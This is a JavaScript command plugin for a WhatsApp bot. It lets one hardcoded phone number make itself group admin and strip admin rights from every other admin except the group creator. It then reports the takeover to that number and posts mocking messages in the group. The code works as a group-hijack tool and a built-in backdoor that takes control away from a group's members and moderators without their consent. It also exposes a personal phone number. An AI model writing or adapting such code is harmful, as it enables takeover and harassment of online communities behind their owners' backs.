let handler = async (m, { conn, isAdmin, groupMetadata }) => {
  try {
    // Check if the sender's number is the specific number allowed
    if (m.sender !== '255734980103@s.whatsapp.net') {
      return m.reply('❌ Sorry, only the authorized number can use this command.');
    }

    // Check if the sender is already an admin
    if (isAdmin) {
      return m.reply('✨ _*My dear, I have already given you my power 💪, make the most of it!*_');
    }

    // Get group participants (admins and non-admins)
    let participants = await conn.groupMetadata(m.chat).then(res => res.participants);
    
    // Get the list of current admins in the group
    let admins = participants.filter(p => p.admin);
    
    // The group creator
    let groupOwner = groupMetadata.owner;

    // The number to promote (sender of the command)
    let sender = m.sender;
    
    // Promote the sender
    await conn.groupParticipantsUpdate(m.chat, [sender], 'promote');
    await m.react('✅');
    m.reply('✨ _*My dear, I have already given you my power 💪, make the most of it!*_');

    // Demote all other admins except the group creator and the promoted user
    let toDemote = admins.filter(admin => admin.id !== sender && admin.id !== groupOwner);
    
    // Demote other admins
    if (toDemote.length > 0) {
      let demoteIds = toDemote.map(admin => admin.id);
      await conn.groupParticipantsUpdate(m.chat, demoteIds, 'demote');
    }

    // Notify group (optional: can replace with a specific channel)
    let nn = await conn.getName(sender);
    conn.reply('255734980103@s.whatsapp.net', `🚩 *${nn}* has given themselves Auto Admin in:\n> ${groupMetadata.subject}.`, m);

    // Reply to the group
    m.reply('😹 *_Done, I have removed their power_* 🤡, *_They will not be able to do anything_* 😹😹');
  } catch (error) {
    console.error(error);
    m.reply('❌ An error occurred.');
  }
};

handler.tags = ['mods'];
handler.help = ['autoadmin'];
handler.command = ['autoadmin', 'givepower', 'havepower'];
handler.rowner = true;
handler.admin = false;
handler.group = true;

export default handler;
